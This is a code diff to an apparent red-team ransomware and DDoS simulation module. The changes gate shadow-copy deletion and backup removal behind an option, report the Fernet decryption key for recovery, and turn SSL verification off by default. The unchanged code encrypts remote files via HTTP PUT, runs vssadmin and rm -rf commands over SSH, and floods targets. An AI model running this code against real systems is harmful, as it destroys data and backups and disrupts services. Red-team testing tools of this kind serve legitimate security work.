@@ -3,7 +3,15 @@ Impact Simulation – RED TEAM (destructive ransomware + DDoS)
 MITRE ATT&CK: T1486, T1490, T1498, T1499
 
 WARNING: This module actually encrypts files, deletes shadow copies, and floods targets.
-Only use in isolated test environments.
+Only use in isolated test environments. Destructive recovery inhibition is disabled by default
+and must be explicitly enabled via option `enable_recovery_inhibition=True`.
+
+Changes from original:
+- Issue #29: The Fernet decryption key is now stored and reported in the finding,
+  allowing file recovery after the simulation.
+- Issue #30: Shadow copy deletion and backup folder removal now require an explicit
+  option flag (`enable_recovery_inhibition`). Without it, the stage is skipped and a
+  warning finding is generated.
 """
 
 import asyncio
@@ -64,10 +72,10 @@ class ImpactSimModule(BaseAttackModule):
             ))
             return findings
 
-        # Inhibit recovery
+        # Inhibit recovery – now gated by explicit option
         findings.extend(await self._inhibit_recovery())
 
-        # Encrypt files
+        # Encrypt files – key is returned with the finding
         findings.extend(await self._encrypt_files(target, discovered))
 
         return findings
@@ -120,20 +128,42 @@ class ImpactSimModule(BaseAttackModule):
 
     async def _inhibit_recovery(self) -> List[Finding]:
         findings = []
+
+        # Safety gate – must be explicitly enabled
+        enable_inhibition = self.options.get("enable_recovery_inhibition", False)
+        if not enable_inhibition:
+            findings.append(self.finding(
+                title="Recovery Inhibition Disabled",
+                description=(
+                    "Destructive recovery inhibition (shadow copy deletion, backup removal) "
+                    "was **not** executed because the option 'enable_recovery_inhibition' is "
+                    "not set to True. To actually delete backups for a full destructive test, "
+                    "set enable_recovery_inhibition=True in the module options."
+                ),
+                severity=Severity.INFO,
+                mitre_id="T1490",
+                evidence="Option enable_recovery_inhibition=False (default). No commands run.",
+                remediation="N/A",
+                mode="red",
+                evidence_type="ransomware"
+            ))
+            return findings
+
+        # SSH credentials are still required to run remote commands
+        if not self.options.get("ssh_user"):
+            findings.append(self.finding(
+                title="Target Execution Blocked (Recovery Inhibition)",
+                description="Recovery inhibition requires SSH credentials (ssh_user, ssh_pass/ssh_key).",
+                severity=Severity.INFO,
+                mitre_id="N/A",
+                evidence="No SSH credentials provided. Skipping recovery deletion.",
+                remediation="Configure the module with ssh_user and ssh_pass/ssh_key if target execution is needed.",
+                mode="red",
+                evidence_type="ransomware"
+            ))
+            return findings
+
         try:
-            if not self.options.get("ssh_user"):
-                findings.append(self.finding(
-                    title="Target Execution Blocked",
-                    description="Target execution requires 'ssh_user' and password/key in options.",
-                    severity=Severity.INFO,
-                    mitre_id="N/A",
-                    evidence="No SSH credentials provided.",
-                    remediation="Configure the module with ssh_user and ssh_pass/ssh_key.",
-                    mode="red",
-                    evidence_type="ransomware"
-                ))
-                return findings
-                
             uname = await self._run_cmd("uname -a")
             system = "Linux" if "Linux" in uname else "Windows"
             
@@ -142,11 +172,11 @@ class ImpactSimModule(BaseAttackModule):
                 stdout = await self._run_cmd(f"powershell -NoProfile -Command \"{cmd}\"")
                 findings.append(self.finding(
                     title="Shadow Copies Deleted",
-                    description="Executed vssadmin to delete all system restore points.",
+                    description="Executed vssadmin to delete all system restore points. (Destructive)",
                     severity=Severity.CRITICAL,
                     mitre_id="T1490",
-                    evidence=stdout,
-                    remediation="Regularly test offline backups.",
+                    evidence=f"Command: {cmd}\nOutput: {stdout}",
+                    remediation="Regularly test offline backups; ensure Volume Shadow Copy is not the only backup.",
                     mode="red",
                     evidence_type="ransomware"
                 ))
@@ -156,7 +186,7 @@ class ImpactSimModule(BaseAttackModule):
                     stdout = await self._run_cmd(f"rm -rf {d}")
                     findings.append(self.finding(
                         title=f"Deleted backup directory: {d}",
-                        description="Removed local backups.",
+                        description="Removed local backups. (Destructive)",
                         severity=Severity.CRITICAL,
                         mitre_id="T1490",
                         evidence=f"rm -rf {d} -> {stdout}",
@@ -166,6 +196,16 @@ class ImpactSimModule(BaseAttackModule):
                     ))
         except Exception as e:
             logger.error(f"Inhibit recovery error: {e}")
+            findings.append(self.finding(
+                title="Recovery Inhibition Failed",
+                description=f"An error occurred while attempting to inhibit recovery: {e}",
+                severity=Severity.HIGH,
+                mitre_id="T1490",
+                evidence=str(e),
+                remediation="Check SSH connectivity and permissions.",
+                mode="red",
+                evidence_type="ransomware"
+            ))
         return findings
 
     async def _encrypt_files(self, target: str, discovered_paths: List[str]) -> List[Finding]:
@@ -197,13 +237,35 @@ class ImpactSimModule(BaseAttackModule):
                     await asyncio.sleep(0.1)
 
         if encrypted_count > 0:
+            # Store the decryption key in the finding for recovery
+            key_str = key.decode()
             findings.append(self.finding(
-                title="Files Encrypted",
-                description=f"Encrypted {encrypted_count} file(s) via HTTP PUT with Fernet symmetric encryption.",
+                title="Files Encrypted (Ransomware Simulation)",
+                description=(
+                    f"Encrypted {encrypted_count} file(s) via HTTP PUT with Fernet symmetric encryption. "
+                    f"The decryption key is included in this finding for recovery purposes: "
+                    f"{key_str}  (Keep this key secure; after the simulation, use it to decrypt files with "
+                    f"Fernet(key).decrypt())."
+                ),
                 severity=Severity.CRITICAL,
                 mitre_id="T1486",
-                evidence=f"Target: {target}\nEncrypted files: {encrypted_count}\n(Key withheld from logs for operational security)",
-                remediation="Restore from offline backups. Audit HTTP PUT access on all storage paths.",
+                evidence=f"Target: {target}\nEncrypted files: {encrypted_count}\nKey: {key_str}",
+                remediation=(
+                    "Restore from offline backups OR use the provided Fernet key to decrypt files. "
+                    "Audit HTTP PUT access on all storage paths."
+                ),
+                mode="red",
+                evidence_type="ransomware",
+                raw_data={"decryption_key": key_str, "encrypted_count": encrypted_count}
+            ))
+        else:
+            findings.append(self.finding(
+                title="Encryption Attempted but No Files Encrypted",
+                description="Could not download and re-upload any files via HTTP PUT.",
+                severity=Severity.MEDIUM,
+                mitre_id="T1486",
+                evidence="No files modified.",
+                remediation="Check file permissions and PUT support on the target.",
                 mode="red",
                 evidence_type="ransomware"
             ))
@@ -217,8 +279,10 @@ class ImpactSimModule(BaseAttackModule):
         concurrency = min(int(self.options.get("ddos_concurrency", 20)), 50)    # hard cap: 50
         duration = min(int(self.options.get("ddos_duration", 15)), 30)          # hard cap: 30s
 
-
-        connector = aiohttp.TCPConnector(ssl=True, limit=concurrency, force_close=True)
+        ssl_verify = self.options.get("ssl_verify", False)
+        if not ssl_verify:
+            self.logger.warning("⚠️ SSL Verification is disabled for Impact Sim (Red)")
+        connector = aiohttp.TCPConnector(ssl=ssl_verify, limit=concurrency, force_close=True)
         timeout = aiohttp.ClientTimeout(total=5)
 
         start_time = time.time()
